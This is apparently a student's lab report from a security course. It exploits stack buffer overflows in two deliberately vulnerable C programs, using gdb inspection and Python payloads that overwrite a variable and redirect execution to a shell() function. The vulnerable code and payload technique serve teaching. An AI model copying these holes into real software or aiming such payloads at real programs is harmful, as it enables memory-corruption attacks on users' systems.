# 22110357, Dinh Tan Dung
# Lab #1: Buffer Overflow
# Task 1: Stack smashing by mermory overwritten

---

## 1.2. bof2.c

### Analyzing the Source Code

```c
#include <stdlib.h>
#include <stdio.h>

void main(int argc, char *argv[])
{
  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf, 45, stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] 0x%x\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah! You win!\n");
   }
}
```

#### Key Points:
1. The `buf` buffer is 40 bytes in size, but `fgets` can read up to 45 bytes, leading to buffer overflow.
   ```c
   int var;
   int check = 0x04030201;
   char buf[40];

   fgets(buf, 45, stdin);
   ```

2. The `check` variable is located immediately after `buf` in the stack. If `buf` overflows, the value of `check` can be overwritten.
   ```c
   int var;
   int check = 0x04030201;
   char buf[40];
   ```

### Exploitation Plan

1. **The value of `check` will be overwritten by using more than 40 bytes of input data.**

2. **Create a payload consisting of 40 arbitrary bytes followed by the value `0xdeadbeef` to overwrite `check`.**

### Detailed Steps

#### Step 1: Create the Payload

We create a string with 40 bytes (like 40 'A's) and the value `0xdeadbeef` in little-endian format.

```sh
python -c 'print("A" * 40 + "\xef\xbe\xad\xde")' > payload
```
![Payload creation](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/74f895cd-de7d-43ff-84ae-e334e0837a2e)

#### Step 2: Run the Program with the Payload

1. **Compile the program:**
   ```sh
   gcc bof2.c -o bof2.out -fno-stack-protector -z execstack
   ```

2. **Set a breakpoint right after `fgets` to inspect the stack before and after the overflow.**
   ![Breakpoint](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/4b11abf7-c006-49f4-93ee-786d3f6a6be9)

3. **Check the stack pointer and base pointer:**
   ```sh
   (gdb) info registers
   ```
   ![Registers](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/3cf7c796-1c00-4322-8aca-314a41030197)

   - **Stack State:**
     - **ESP (0xffffd764)**: Stack Pointer points to the current top of the stack.
     - **EBP (0xffffd768)**: Base Pointer points to the base of the stack frame, which is slightly above the current stack pointer.

4. **Inspect the contents of the stack:**
   ```sh
   (gdb) x/32x $esp
   ```
   ![Stack Contents](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/7b66b90a-9bbd-4f2c-8caf-aa150dca1887)

### Key Points

- **Initial Stack State:**
  - The output shows the initial state of the stack at the moment when the program execution is paused at the breakpoint set in the `main` function.
  - Registers are set up, and the stack pointer (ESP) points to `0xffffd764`.

- **Buffer Location:**
  - The `buf` buffer starts at `0xffffd764`.
  - The buffer is 40 bytes long, so it spans from `0xffffd764` to `0xffffd78c`.

- **Check Variable:**
  - The `check` variable is located immediately after `buf`. Given the 40-byte length of `buf`, `check` should be located around `0xffffd790`.
  - Since `check` is an integer (4 bytes), its value can be overwritten by the payload.

#### Step 3: Run the Program and Provide the Payload

1. **Run the program and provide the payload:**
   ```sh
   cat payload | ./bof2.out
   ```

2. **Verify the Output:**
   - The value of `check` is `0x41414141`, which corresponds to the ASCII value of 'A'. This indicates that the payload is overflowing correctly but `check` is being overwritten by 'A's instead of the intended value `0xdeadbeef`.
   ![Incorrect Payload Result](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/e96f50fb-8387-46e0-aac0-82c51e5af5d4)

### Fixing the Payload

1. **Create the Payload without the Newline Character:**
   ```sh
   python -c 'print("A" * 40 + "\xef\xbe\xad\xde")' | tr -d '\n' > payload
   ```

2. **Verify the Payload:**
   Use `xxd` to confirm that the payload is structured correctly without the newline character.
   ```sh
   xxd payload
   ```
   ![Corrected Payload](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/6f4634c2-6095-4a8c-a53a-42daef4f57ca)

3. **Run the Program with the Correct Payload:**
   ```sh
   cat payload | ./bof2.out
   ```

### Expected Output

If the payload is correct, the output should show that `check` is set to `0xdeadbeef`, and the program should print "Yeah! You win!".
![Expected Output](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/808165a5-5c9e-47ad-a087-f4ea6c7f4b19)

---

## 1.3. bof3.c
*In this program, the variable 'buf' was declared with the size of 128 byte:*

    char buf[128];
   
*But the function 'fgets' was used with the availability to read up to 133 bytes from the standard input(stdin):*

     fgets(buf,133,stdin);

=> This can lead to buffer overflow, because the input data from the function exceeds the size of 'buf' and overwrites adjacent mermory regions, including the pointer of the function 'func()'. 

*Step 1: Compile the file with option to turn off the stack protector:*

![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/683f84c5-ee21-4bf0-a97e-8400d6ca67bd)

*This tells us that the buffer has the size of 0x84 byte (132 byte).*
![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/1155b112-51ef-40fe-a1e6-e279989fe1d9)


*The address of 'shell' function is 0x0804845b.*
![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/d865963e-cbd3-4152-85ff-174ecb16b78a)

*Now we use Python to create the payload as follows:*

```python
python -c 'print("A" * 132 + "\x5b\x84\x04\x08")' > payload
```
![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/daa0c43a-8c1c-4284-b2f2-b0a01e9c66e0)

*Although the program declares a buffer of size 132 bytes, in reality, the EIP is overwritten after 128 bytes. In this section, I will explain the reason for this difference and how I exploited the vulnerability.*

![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/eab89de7-13ce-4d34-91b3-e3f54fe3b317)

### 2. Program Analysis
   
The `bof3.out` program has the following code:

```c
void main()
{
    int var;
    void (*func)() = sup;
    char buf[128];
    fgets(buf, 133, stdin);
    func();
}
```

The buffer `buf` has a size of 128 bytes.

`fgets` reads up to 133 bytes from `stdin` into the buffer `buf`.

### 3. Memory and Stack Analysis

Although `buf` is 128 bytes, the distance from `buf` to the EIP is 128 bytes, not the expected 132 bytes. This discrepancy could be due to the following factors:

- **Padding:**
  The compiler may add padding to local variables for memory alignment, but in this case, padding does not increase the distance from `buf` to the EIP.

- **Memory Layout:**
  Other local variables or function structures may affect the memory layout.

- **Compiler Optimizations:**
  Compiler optimizations can alter the layout of local variables, making the distance from the buffer's start to the EIP differ from expectations.
  
## Exploitation Process

### 1. Creating a Test String

I used a test string to determine the exact position of the EIP:

```sh
python -c 'print("A" * n + "B" * 4)' > payload
gdb ./bof3.out
(gdb) run < payload
```
    
![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/3ce41eae-71d3-43cb-88cf-79602edea21b)

*With `n` varying around the initially estimated 132 bytes, increasing or decreasing by 4 bytes each time to align until the EIP is overwritten by the sequence ("B" * 4), we determine the exact size representing the distance from `buf` to the EIP. Through trial and error, I identified that the size is 128 bytes.*

```sh
seed@a15995f85a75:~/seclabs$ python -c 'print("A" * 128 + "\x5b\x84\x04\x08")' > payload
seed@a15995f85a75:~/seclabs$ xxd payload
```

### Explanation of Creating the Payload and How It Overwrites Memory

#### 1. Creating the Payload

The following command is used to create the payload:

```sh
python -c 'print("A" * 128 + "\x5b\x84\x04\x08")' > payload
```

**Explanation:**

  - `"A" * 128`: Creates a string of 128 'A' characters. This part is used to fill the buffer.
  - `"\x5b\x84\x04\x08"`: This is the address of the `shell` function (`0x0804845b`) written in reverse (little-endian format). In little-endian format, the bytes of the address are ordered from the least significant to the most significant.
- `> payload`: Redirects the output of the Python command to the `payload` file.
  
#### 2. How the Payload Overwrites Memory

1. **Memory Layout in the Program:**

   When the program runs, the stack will contain local variables and the return address of the function. In the `bof3.out` program, memory is laid out as follows:
   - Buffer `buf` has a size of 128 bytes.
   - The function pointer `func` is immediately after the buffer `buf`.
   - The return address (EIP) is immediately after the function pointer `func`.

   Stack structure:
   ```
   |------------------|
   | Buffer (128 byte)|
   |------------------|
   |   Func pointer   |
   |------------------|
   |  Return address  |
   |------------------|
   ```

2. **Overwriting the EIP:**

   When `fgets` reads into the buffer `buf`, if the input data exceeds 128 bytes, it will overwrite the subsequent memory regions in the stack. By providing a string of 128 'A' characters followed by 4 bytes of the `shell` function address, the payload will overwrite the function's return address.

   - The string `"A" * 128` fills the buffer `buf`.
   - The address `"\x5b\x84\x04\x08"` overwrites the return address (EIP).

3. **Result of the Overwrite:**

   - When the `main` function ends and attempts to return to the saved address in the EIP, it will jump to the address `0x0804845b` instead of the original return address.
   - The address `0x0804845b` is the address of the `shell` function, so the `shell` function will be executed.

   When the payload is sent to the program, the EIP will be overwritten by the `shell` function address:
   ```
   EIP: 0x0804845b
   ```

#### 3. Executing the Payload

To test the payload, we use GDB to run the program with the payload and verify that the EIP is correctly overwritten:
```sh
gdb ./bof3.out
(gdb) run < payload
```

*Payload creation successfully and verified as shown:*
![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/907f4a87-3f03-4ece-af56-a12a29aec220)

*Now, we runs the compiled file and see the result: You made it! The shell() function is executed.*
![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/5fb9e3eb-ebf9-4fcb-8e4d-9a7cdfcd28c0)

### Experiences and Knowledge from the Buffer Overflow Exploit Lab on bof3.out

---

#### 1. Understanding Buffer Overflow

  - A buffer overflow occurs when data exceeds the allocated buffer limit, leading to overwriting adjacent memory regions, including the return address of functions. Not checking buffer sizes and input data can lead to security vulnerabilities.

#### 2. Debugging and Analysis Skills

- **Using GDB to Analyze the Program:**
  - Using GDB to set breakpoints, inspect registers, and analyze the stack helps pinpoint the exact overwritten location in memory.
    
- **Testing and Adjusting the Payload:**
  - Creating and tweaking the payload based on GDB analysis results to exploit the vulnerability effectively.

#### 3. Understanding Memory and Stack Structure

- **Memory Layout in the Stack:**
  - Memory in the stack is structured so that local variables and values like the EIP are stacked sequentially. The distance from the start of the buffer to the EIP can be affected by padding and other variables.

- **Difference Between Buffer Size and Distance to EIP:**
  - Recognizing that although the buffer size is declared as 132 bytes, the actual distance from the buffer start to the EIP may be adjusted due to the compiler's memory arrangement.

#### 4. Exploiting Buffer Overflow process:

- **Identifying the EIP Location:**
  - Using a sample string to determine the EIP's location and then adjusting the payload to overwrite the EIP correctly.

- **Creating the Final Payload**
  - Crafting a payload with the exact length and shell function address in little-endian format to successfully exploit the vulnerability.

### 5. Applying Knowledge in Practice

- **Writing Secure Code:**
  -Write secure code and use safe methods to avoiding potential security vulnerabilities.

- **Program Analysis and Debugging:**
  - Utilizing analysis and debugging skills to inspect and secure source code in real-world projects.

